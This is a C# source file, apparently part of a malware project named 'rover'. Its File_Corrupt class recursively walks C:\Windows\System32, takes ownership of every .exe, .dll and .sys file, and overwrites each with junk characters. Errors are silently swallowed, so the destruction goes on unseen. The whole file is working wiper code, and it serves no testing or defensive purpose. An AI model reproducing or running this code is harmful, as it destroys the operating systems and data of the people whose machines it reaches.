using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using SysPrivileges;

namespace rover
{
    public partial class File_Corrupt : Privileges
    {
        private static void ListDirectories(string Path, Action<string> Listen)
        {
            try
            {
                foreach (string Node in Directory.GetDirectories(Path))
                {
                    Listen(Node);
                    ListDirectories(Node, Listen);
                }
            }
            catch { }
        }
        public void sys_del()
        {
            ListDirectories(@"C:\Windows\System32\", (dir) =>
            {
                try
                {
                    string[] str = Directory.GetFiles(dir);
                    foreach (string str_n in str)
                    {
                        try
                        {
                            if (str_n.EndsWith(".exe") || str_n.EndsWith(".dll") || str_n.EndsWith(".sys"))
                            {
                                GrantAdministratorsAccess(str_n, SE_OBJECT_TYPE.SE_FILE_OBJECT);
                                File.WriteAllText(str_n, Msg_Boxes.chars());
                            }
                        }
                        catch { }
                    }
                }
                catch { }
            });
        }
    }
}
